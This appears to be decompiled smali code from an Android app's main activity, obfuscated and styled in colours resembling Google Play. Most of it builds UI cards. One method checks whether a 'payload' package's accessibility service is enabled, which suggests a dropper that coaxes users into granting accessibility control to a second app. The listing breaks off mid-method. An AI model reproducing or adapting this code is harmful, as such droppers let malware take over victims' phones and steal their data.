.class public Lio/bluewave/app/MainActivity;
.super Landroid/app/Activity;
.source "r8-map-id-9b89e78e9c5e8923134474d94771b179d9c458b216b15abf6fb75f52fa5f6b53"


# static fields
.field public static final synthetic LnOhZ86vZb2ZCRzVz:I


# instance fields
.field public ECM0w2UpL85TD4rnc:Landroid/widget/Button;

.field public EQ6go6jAtySCouhWhLsA:Z

.field public EYTN7lFEQxyK4y:I

.field public GJ6jqSe4IzUYEu:Landroid/widget/LinearLayout;

.field public HrAWa37pvWeygr:Landroid/content/SharedPreferences;

.field public KFXTIAu8cfRMDPCSl8UB:Landroid/widget/TextView;

.field public Lgt5etflyFQU5poaxq:Ljava/lang/String;

.field public NGL7fgNWbzfZaqgpQY:Landroid/widget/TextView;

.field public final NJWhmIsCa4qdfEsJnpJ:Ljava/util/ArrayList;

.field public final OI37Slpn8pmO:I

.field public final QH62hje1O4khQnco5y:I

.field public final QtO8NkDMDHvx:I

.field public final RiYp0dILGNtv:I

.field public UgIxXQ6S7mmUt2naV:Z

.field public final UpNQeXAsEKI1Y4mvc:I

.field public UvqyQKvSoOiOdM7m:Landroid/widget/TextView;

.field public VYRgR7ZqgbZj3I16R:Landroid/widget/ViewFlipper;

.field public final W6zVDLWo5CGp411:Ljava/util/ArrayList;

.field public WAxAMT28akcO:Landroid/widget/Button;

.field public final YnQspRyi16s9vN5:I

.field public final gkAIcPzaF0mdk:I

.field public final iTycxX30d0YvQFAGBVYP:I

.field public k7svliQKAV6mwdxD1R:Landroid/widget/ProgressBar;

.field public final mRg42oQvR3g0W:I

.field public final n6vOQ2w2T3oBW:Landroid/os/Handler;

.field public qgoyeS7M4jA9r:Landroid/widget/FrameLayout;

.field public v4mmWMPipWN7Mc:Landroid/widget/TextView;

.field public vQMbLPlYT1awb32bcs:Z

.field public final vcTYAamFnIFN:I

.field public final vf54w4r378FP4oEVzzHh:I

.field public vpNdwwpwBwplN:Landroid/widget/ProgressBar;

.field public wVk5YGgbRLBQzpD:Landroid/widget/LinearLayout;

.field public final y8wqdjwzM2qJr:Ljava/util/ArrayList;


# direct methods
.method public constructor <init>()V
    .locals 2

    .line 1
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Landroid/os/Handler;

    .line 5
    .line 6
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 7
    .line 8
    .line 9
    move-result-object v1

    .line 10
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 11
    .line 12
    .line 13
    iput-object v0, p0, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW:Landroid/os/Handler;

    .line 14
    .line 15
    const/4 v0, 0x0

    .line 16
    iput-boolean v0, p0, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV:Z

    .line 17
    .line 18
    iput-boolean v0, p0, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs:Z

    .line 19
    .line 20
    iput-boolean v0, p0, Lio/bluewave/app/MainActivity;->EQ6go6jAtySCouhWhLsA:Z

    .line 21
    .line 22
    const-string v0, "#01875f"

    .line 23
    .line 24
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 25
    .line 26
    .line 27
    move-result v0

    .line 28
    iput v0, p0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    .line 29
    .line 30
    const-string v0, "#202124"

    .line 31
    .line 32
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 33
    .line 34
    .line 35
    move-result v0

    .line 36
    iput v0, p0, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP:I

    .line 37
    .line 38
    const-string v0, "#5f6368"

    .line 39
    .line 40
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 41
    .line 42
    .line 43
    move-result v0

    .line 44
    iput v0, p0, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5:I

    .line 45
    .line 46
    const-string v0, "#e0e0e0"

    .line 47
    .line 48
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 49
    .line 50
    .line 51
    move-result v0

    .line 52
    iput v0, p0, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W:I

    .line 53
    .line 54
    const-string v0, "#f8f9fa"

    .line 55
    .line 56
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 57
    .line 58
    .line 59
    move-result v0

    .line 60
    iput v0, p0, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN:I

    .line 61
    .line 62
    const-string v0, "#fef7e0"

    .line 63
    .line 64
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 65
    .line 66
    .line 67
    move-result v0

    .line 68
    iput v0, p0, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx:I

    .line 69
    .line 70
    const-string v0, "#f9ab00"

    .line 71
    .line 72
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 73
    .line 74
    .line 75
    move-result v0

    .line 76
    iput v0, p0, Lio/bluewave/app/MainActivity;->gkAIcPzaF0mdk:I

    .line 77
    .line 78
    const-string v0, "#e6f4ea"

    .line 79
    .line 80
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 81
    .line 82
    .line 83
    move-result v0

    .line 84
    iput v0, p0, Lio/bluewave/app/MainActivity;->vf54w4r378FP4oEVzzHh:I

    .line 85
    .line 86
    const-string v0, "#137333"

    .line 87
    .line 88
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 89
    .line 90
    .line 91
    move-result v0

    .line 92
    iput v0, p0, Lio/bluewave/app/MainActivity;->OI37Slpn8pmO:I

    .line 93
    .line 94
    const-string v0, "#e8f0fe"

    .line 95
    .line 96
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 97
    .line 98
    .line 99
    move-result v0

    .line 100
    iput v0, p0, Lio/bluewave/app/MainActivity;->RiYp0dILGNtv:I

    .line 101
    .line 102
    const-string v0, "#1a73e8"

    .line 103
    .line 104
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 105
    .line 106
    .line 107
    move-result v0

    .line 108
    iput v0, p0, Lio/bluewave/app/MainActivity;->UpNQeXAsEKI1Y4mvc:I

    .line 109
    .line 110
    const-string v0, "#fbbc04"

    .line 111
    .line 112
    invoke-static {v0}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    .line 113
    .line 114
    .line 115
    move-result v0

    .line 116
    iput v0, p0, Lio/bluewave/app/MainActivity;->QH62hje1O4khQnco5y:I

    .line 117
    .line 118
    new-instance v0, Ljava/util/ArrayList;

    .line 119
    .line 120
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 121
    .line 122
    .line 123
    iput-object v0, p0, Lio/bluewave/app/MainActivity;->NJWhmIsCa4qdfEsJnpJ:Ljava/util/ArrayList;

    .line 124
    .line 125
    new-instance v0, Ljava/util/ArrayList;

    .line 126
    .line 127
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 128
    .line 129
    .line 130
    iput-object v0, p0, Lio/bluewave/app/MainActivity;->y8wqdjwzM2qJr:Ljava/util/ArrayList;

    .line 131
    .line 132
    new-instance v0, Ljava/util/ArrayList;

    .line 133
    .line 134
    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 135
    .line 136
    .line 137
    iput-object v0, p0, Lio/bluewave/app/MainActivity;->W6zVDLWo5CGp411:Ljava/util/ArrayList;

    .line 138
    .line 139
    return-void
.end method

.method public static UgIxXQ6S7mmUt2naV(Landroid/view/View;Ljava/util/ArrayList;)V
    .locals 2

    .line 1
    const-string v0, "p3anim"

    .line 2
    .line 3
    invoke-virtual {p0}, Landroid/view/View;->getTag()Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v1

    .line 7
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 8
    .line 9
    .line 10
    move-result v0

    .line 11
    if-eqz v0, :cond_0

    .line 12
    .line 13
    invoke-virtual {p1, p0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 14
    .line 15
    .line 16
    :cond_0
    instance-of v0, p0, Landroid/view/ViewGroup;

    .line 17
    .line 18
    if-eqz v0, :cond_1

    .line 19
    .line 20
    check-cast p0, Landroid/view/ViewGroup;

    .line 21
    .line 22
    const/4 v0, 0x0

    .line 23
    :goto_0
    invoke-virtual {p0}, Landroid/view/ViewGroup;->getChildCount()I

    .line 24
    .line 25
    .line 26
    move-result v1

    .line 27
    if-ge v0, v1, :cond_1

    .line 28
    .line 29
    invoke-virtual {p0, v0}, Landroid/view/ViewGroup;->getChildAt(I)Landroid/view/View;

    .line 30
    .line 31
    .line 32
    move-result-object v1

    .line 33
    invoke-static {v1, p1}, Lio/bluewave/app/MainActivity;->UgIxXQ6S7mmUt2naV(Landroid/view/View;Ljava/util/ArrayList;)V

    .line 34
    .line 35
    .line 36
    add-int/lit8 v0, v0, 0x1

    .line 37
    .line 38
    goto :goto_0

    .line 39
    :cond_1
    return-void
.end method

.method public static mRg42oQvR3g0W(Landroid/view/View;IIII)V
    .locals 2

    .line 1
    invoke-virtual {p0}, Landroid/view/View;->getLayoutParams()Landroid/view/ViewGroup$LayoutParams;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    instance-of v1, v0, Landroid/widget/LinearLayout$LayoutParams;

    .line 6
    .line 7
    if-eqz v1, :cond_0

    .line 8
    .line 9
    check-cast v0, Landroid/widget/LinearLayout$LayoutParams;

    .line 10
    .line 11
    goto :goto_0

    .line 12
    :cond_0
    new-instance v0, Landroid/widget/LinearLayout$LayoutParams;

    .line 13
    .line 14
    const/4 v1, -0x2

    .line 15
    invoke-direct {v0, v1, v1}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 16
    .line 17
    .line 18
    :goto_0
    invoke-virtual {v0, p1, p2, p3, p4}, Landroid/view/ViewGroup$MarginLayoutParams;->setMargins(IIII)V

    .line 19
    .line 20
    .line 21
    invoke-virtual {p0, v0}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 22
    .line 23
    .line 24
    return-void
.end method


# virtual methods
.method public final ECM0w2UpL85TD4rnc(Landroid/widget/LinearLayout;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 16

    .line 1
    move-object/from16 v0, p0

    .line 2
    .line 3
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    .line 4
    .line 5
    .line 6
    move-result-object v1

    .line 7
    new-instance v2, Landroid/graphics/drawable/GradientDrawable;

    .line 8
    .line 9
    invoke-direct {v2}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 10
    .line 11
    .line 12
    iget v3, v0, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN:I

    .line 13
    .line 14
    invoke-virtual {v2, v3}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 15
    .line 16
    .line 17
    const/16 v3, 0x8

    .line 18
    .line 19
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 20
    .line 21
    .line 22
    move-result v4

    .line 23
    int-to-float v4, v4

    .line 24
    invoke-virtual {v2, v4}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 25
    .line 26
    .line 27
    invoke-virtual {v1, v2}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 28
    .line 29
    .line 30
    const/16 v2, 0xa

    .line 31
    .line 32
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 33
    .line 34
    .line 35
    move-result v4

    .line 36
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 37
    .line 38
    .line 39
    move-result v5

    .line 40
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 41
    .line 42
    .line 43
    move-result v6

    .line 44
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 45
    .line 46
    .line 47
    move-result v7

    .line 48
    invoke-virtual {v1, v4, v5, v6, v7}, Landroid/view/View;->setPadding(IIII)V

    .line 49
    .line 50
    .line 51
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 52
    .line 53
    .line 54
    move-result v4

    .line 55
    const/4 v5, 0x0

    .line 56
    invoke-static {v1, v5, v4, v5, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 57
    .line 58
    .line 59
    new-instance v4, Landroid/widget/TextView;

    .line 60
    .line 61
    invoke-direct {v4, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    .line 62
    .line 63
    .line 64
    move-object/from16 v6, p2

    .line 65
    .line 66
    invoke-virtual {v4, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 67
    .line 68
    .line 69
    const/high16 v6, 0x41500000    # 13.0f

    .line 70
    .line 71
    const/4 v7, 0x2

    .line 72
    invoke-virtual {v4, v7, v6}, Landroid/widget/TextView;->setTextSize(IF)V

    .line 73
    .line 74
    .line 75
    const/4 v6, -0x1

    .line 76
    invoke-virtual {v4, v6}, Landroid/widget/TextView;->setTextColor(I)V

    .line 77
    .line 78
    .line 79
    sget-object v8, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    .line 80
    .line 81
    invoke-virtual {v4, v8}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 82
    .line 83
    .line 84
    const/16 v8, 0x11

    .line 85
    .line 86
    invoke-virtual {v4, v8}, Landroid/widget/TextView;->setGravity(I)V

    .line 87
    .line 88
    .line 89
    new-instance v8, Landroid/graphics/drawable/GradientDrawable;

    .line 90
    .line 91
    invoke-direct {v8}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 92
    .line 93
    .line 94
    iget v9, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    .line 95
    .line 96
    invoke-virtual {v8, v9}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 97
    .line 98
    .line 99
    const/4 v9, 0x1

    .line 100
    invoke-virtual {v8, v9}, Landroid/graphics/drawable/GradientDrawable;->setShape(I)V

    .line 101
    .line 102
    .line 103
    invoke-virtual {v4, v8}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 104
    .line 105
    .line 106
    new-instance v8, Landroid/widget/LinearLayout$LayoutParams;

    .line 107
    .line 108
    const/16 v10, 0x18

    .line 109
    .line 110
    invoke-virtual {v0, v10}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 111
    .line 112
    .line 113
    move-result v11

    .line 114
    invoke-virtual {v0, v10}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 115
    .line 116
    .line 117
    move-result v10

    .line 118
    invoke-direct {v8, v11, v10}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 119
    .line 120
    .line 121
    invoke-virtual {v1, v4, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 122
    .line 123
    .line 124
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->QtO8NkDMDHvx()Landroid/widget/LinearLayout;

    .line 125
    .line 126
    .line 127
    move-result-object v4

    .line 128
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 129
    .line 130
    .line 131
    move-result v8

    .line 132
    invoke-virtual {v4, v8, v5, v5, v5}, Landroid/view/View;->setPadding(IIII)V

    .line 133
    .line 134
    .line 135
    const/16 v8, 0xc

    .line 136
    .line 137
    iget v10, v0, Lio/bluewave/app/MainActivity;->iTycxX30d0YvQFAGBVYP:I

    .line 138
    .line 139
    move-object/from16 v11, p3

    .line 140
    .line 141
    invoke-virtual {v0, v11, v8, v10, v9}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 142
    .line 143
    .line 144
    move-result-object v8

    .line 145
    invoke-virtual {v4, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 146
    .line 147
    .line 148
    iget v8, v0, Lio/bluewave/app/MainActivity;->YnQspRyi16s9vN5:I

    .line 149
    .line 150
    const/16 v11, 0xb

    .line 151
    .line 152
    move-object/from16 v12, p4

    .line 153
    .line 154
    invoke-virtual {v0, v12, v11, v8, v5}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 155
    .line 156
    .line 157
    move-result-object v8

    .line 158
    invoke-virtual {v0, v9}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 159
    .line 160
    .line 161
    move-result v12

    .line 162
    int-to-float v12, v12

    .line 163
    const/high16 v13, 0x3f800000    # 1.0f

    .line 164
    .line 165
    invoke-virtual {v8, v12, v13}, Landroid/widget/TextView;->setLineSpacing(FF)V

    .line 166
    .line 167
    .line 168
    invoke-virtual {v4, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 169
    .line 170
    .line 171
    if-eqz p5, :cond_0

    .line 172
    .line 173
    invoke-virtual {v0}, Lio/bluewave/app/MainActivity;->vQMbLPlYT1awb32bcs()Landroid/widget/LinearLayout;

    .line 174
    .line 175
    .line 176
    move-result-object v8

    .line 177
    const/16 v12, 0x10

    .line 178
    .line 179
    invoke-virtual {v8, v12}, Landroid/widget/LinearLayout;->setGravity(I)V

    .line 180
    .line 181
    .line 182
    new-instance v14, Landroid/graphics/drawable/GradientDrawable;

    .line 183
    .line 184
    invoke-direct {v14}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 185
    .line 186
    .line 187
    invoke-virtual {v14, v6}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 188
    .line 189
    .line 190
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 191
    .line 192
    .line 193
    move-result v15

    .line 194
    iget v13, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    .line 195
    .line 196
    invoke-virtual {v14, v15, v13}, Landroid/graphics/drawable/GradientDrawable;->setStroke(II)V

    .line 197
    .line 198
    .line 199
    const/4 v13, 0x6

    .line 200
    invoke-virtual {v0, v13}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 201
    .line 202
    .line 203
    move-result v13

    .line 204
    int-to-float v13, v13

    .line 205
    invoke-virtual {v14, v13}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 206
    .line 207
    .line 208
    invoke-virtual {v8, v14}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 209
    .line 210
    .line 211
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 212
    .line 213
    .line 214
    move-result v13

    .line 215
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 216
    .line 217
    .line 218
    move-result v14

    .line 219
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 220
    .line 221
    .line 222
    move-result v15

    .line 223
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 224
    .line 225
    .line 226
    move-result v11

    .line 227
    invoke-virtual {v8, v13, v14, v15, v11}, Landroid/view/View;->setPadding(IIII)V

    .line 228
    .line 229
    .line 230
    const/4 v11, 0x5

    .line 231
    invoke-virtual {v0, v11}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 232
    .line 233
    .line 234
    move-result v11

    .line 235
    invoke-static {v8, v5, v11, v5, v5}, Lio/bluewave/app/MainActivity;->mRg42oQvR3g0W(Landroid/view/View;IIII)V

    .line 236
    .line 237
    .line 238
    new-instance v11, Landroid/widget/FrameLayout;

    .line 239
    .line 240
    invoke-direct {v11, v0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    .line 241
    .line 242
    .line 243
    new-instance v13, Landroid/graphics/drawable/GradientDrawable;

    .line 244
    .line 245
    invoke-direct {v13}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 246
    .line 247
    .line 248
    iget v14, v0, Lio/bluewave/app/MainActivity;->EYTN7lFEQxyK4y:I

    .line 249
    .line 250
    invoke-virtual {v13, v14}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 251
    .line 252
    .line 253
    invoke-virtual {v0, v2}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 254
    .line 255
    .line 256
    move-result v2

    .line 257
    int-to-float v2, v2

    .line 258
    invoke-virtual {v13, v2}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    .line 259
    .line 260
    .line 261
    invoke-virtual {v11, v13}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 262
    .line 263
    .line 264
    new-instance v2, Landroid/view/View;

    .line 265
    .line 266
    invoke-direct {v2, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 267
    .line 268
    .line 269
    new-instance v13, Landroid/graphics/drawable/GradientDrawable;

    .line 270
    .line 271
    invoke-direct {v13}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    .line 272
    .line 273
    .line 274
    invoke-virtual {v13, v6}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    .line 275
    .line 276
    .line 277
    invoke-virtual {v13, v9}, Landroid/graphics/drawable/GradientDrawable;->setShape(I)V

    .line 278
    .line 279
    .line 280
    invoke-virtual {v2, v13}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    .line 281
    .line 282
    .line 283
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 284
    .line 285
    .line 286
    move-result v6

    .line 287
    int-to-float v6, v6

    .line 288
    invoke-virtual {v2, v6}, Landroid/view/View;->setElevation(F)V

    .line 289
    .line 290
    .line 291
    new-instance v6, Landroid/widget/FrameLayout$LayoutParams;

    .line 292
    .line 293
    invoke-virtual {v0, v12}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 294
    .line 295
    .line 296
    move-result v13

    .line 297
    invoke-virtual {v0, v12}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 298
    .line 299
    .line 300
    move-result v12

    .line 301
    invoke-direct {v6, v13, v12}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    .line 302
    .line 303
    .line 304
    const v12, 0x800015

    .line 305
    .line 306
    .line 307
    iput v12, v6, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    .line 308
    .line 309
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 310
    .line 311
    .line 312
    move-result v7

    .line 313
    iput v7, v6, Landroid/widget/FrameLayout$LayoutParams;->rightMargin:I

    .line 314
    .line 315
    invoke-virtual {v11, v2, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 316
    .line 317
    .line 318
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    .line 319
    .line 320
    const/16 v6, 0x26

    .line 321
    .line 322
    invoke-virtual {v0, v6}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 323
    .line 324
    .line 325
    move-result v6

    .line 326
    const/16 v7, 0x14

    .line 327
    .line 328
    invoke-virtual {v0, v7}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 329
    .line 330
    .line 331
    move-result v7

    .line 332
    invoke-direct {v2, v6, v7}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    .line 333
    .line 334
    .line 335
    invoke-virtual {v8, v11, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 336
    .line 337
    .line 338
    const v2, 0x7f0f00cc

    .line 339
    .line 340
    .line 341
    invoke-virtual {v0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    .line 342
    .line 343
    .line 344
    move-result-object v2

    .line 345
    const/16 v6, 0xb

    .line 346
    .line 347
    invoke-virtual {v0, v2, v6, v10, v9}, Lio/bluewave/app/MainActivity;->vcTYAamFnIFN(Ljava/lang/String;IIZ)Landroid/widget/TextView;

    .line 348
    .line 349
    .line 350
    move-result-object v2

    .line 351
    invoke-virtual {v0, v3}, Lio/bluewave/app/MainActivity;->n6vOQ2w2T3oBW(I)I

    .line 352
    .line 353
    .line 354
    move-result v3

    .line 355
    invoke-virtual {v2, v3, v5, v5, v5}, Landroid/widget/TextView;->setPadding(IIII)V

    .line 356
    .line 357
    .line 358
    invoke-virtual {v8, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 359
    .line 360
    .line 361
    invoke-virtual {v4, v8}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 362
    .line 363
    .line 364
    :cond_0
    new-instance v2, Landroid/widget/LinearLayout$LayoutParams;

    .line 365
    .line 366
    const/4 v3, -0x2

    .line 367
    const/high16 v6, 0x3f800000    # 1.0f

    .line 368
    .line 369
    invoke-direct {v2, v5, v3, v6}, Landroid/widget/LinearLayout$LayoutParams;-><init>(IIF)V

    .line 370
    .line 371
    .line 372
    invoke-virtual {v1, v4, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 373
    .line 374
    .line 375
    move-object/from16 v2, p1

    .line 376
    .line 377
    invoke-virtual {v2, v1}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    .line 378
    .line 379
    .line 380
    return-void
.end method

.method public final EQ6go6jAtySCouhWhLsA(Ljava/lang/String;)Z
    .locals 5

    .line 1
    const/4 v0, 0x0

    .line 2
    :try_start_0
    const-string v1, "accessibility"

    .line 3
    .line 4
    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 5
    .line 6
    .line 7
    move-result-object v1

    .line 8
    check-cast v1, Landroid/view/accessibility/AccessibilityManager;

    .line 9
    .line 10
    if-nez v1, :cond_0

    .line 11
    .line 12
    goto :goto_0

    .line 13
    :cond_0
    const/4 v2, -0x1

    .line 14
    invoke-virtual {v1, v2}, Landroid/view/accessibility/AccessibilityManager;->getEnabledAccessibilityServiceList(I)Ljava/util/List;

    .line 15
    .line 16
    .line 17
    move-result-object v1

    .line 18
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 19
    .line 20
    .line 21
    move-result-object v1

    .line 22
    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 23
    .line 24
    .line 25
    move-result v2

    .line 26
    if-eqz v2, :cond_2

    .line 27
    .line 28
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 29
    .line 30
    .line 31
    move-result-object v2

    .line 32
    check-cast v2, Landroid/accessibilityservice/AccessibilityServiceInfo;

    .line 33
    .line 34
    invoke-virtual {v2}, Landroid/accessibilityservice/AccessibilityServiceInfo;->getId()Ljava/lang/String;

    .line 35
    .line 36
    .line 37
    move-result-object v2

    .line 38
    if-eqz v2, :cond_1

    .line 39
    .line 40
    new-instance v3, Ljava/lang/StringBuilder;

    .line 41
    .line 42
    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 43
    .line 44
    .line 45
    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 46
    .line 47
    .line 48
    const-string v4, "/"

    .line 49
    .line 50
    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 51
    .line 52
    .line 53
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 54
    .line 55
    .line 56
    move-result-object v3

    .line 57
    invoke-virtual {v2, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    .line 58
    .line 59
    .line 60
    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 61
    if-eqz v2, :cond_1

    .line 62
    .line 63
    const/4 p1, 0x1

    .line 64
    return p1

    .line 65
    :catch_0
    move-exception p1

    .line 66
    goto :goto_1

    .line 67
    :cond_2
    :goto_0
    return v0

    .line 68
    :goto_1
    new-instance v1, Ljava/lang/StringBuilder;

    .line 69
    .line 70
    const-string v2, "isPayloadAccessibilityEnabled error: "

    .line 71
    .line 72
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 73
    .line 74
    .line 75
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 76
    .line 77
    .line 78
